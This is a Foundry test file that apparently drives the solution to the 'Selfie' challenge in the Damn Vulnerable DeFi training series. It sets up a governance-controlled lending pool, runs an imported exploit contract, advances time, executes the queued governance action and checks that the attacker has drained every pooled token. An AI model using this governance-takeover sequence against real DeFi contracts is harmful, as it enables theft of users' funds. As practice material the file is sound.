// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {Exploit} from "./ExploitSelfie.sol";
import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";

contract Selfie is Test {
    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities utils;
    SimpleGovernance gov;
    DamnValuableTokenSnapshot dvts;
    SelfiePool pool;
    Exploit exploit;

    address payable attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        dvts = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvts), "DVT Snapshot");

        gov = new SimpleGovernance(address(dvts));
        vm.label(address(gov), "Governance");

        pool = new SelfiePool(address(dvts), address(gov));
        vm.label(address(pool), "Pool");

        dvts.transfer(address(pool), TOKENS_IN_POOL);

        assertEq(dvts.balanceOf(address(pool)), TOKENS_IN_POOL);
    }

    function testExploit() public {
        exploit = new Exploit(
            address(gov),
            address(pool),
            address(dvts),
            address(attacker)
        );

        exploit.attack();
        vm.warp(block.timestamp + 2 days);
        gov.executeAction(1);
        validation();
    }

    function validation() public {
        // Attacker has taken all tokens from the pool
        assertEq(dvts.balanceOf(address(pool)), 0);
        assertEq(dvts.balanceOf(attacker), TOKENS_IN_POOL);
    }
}
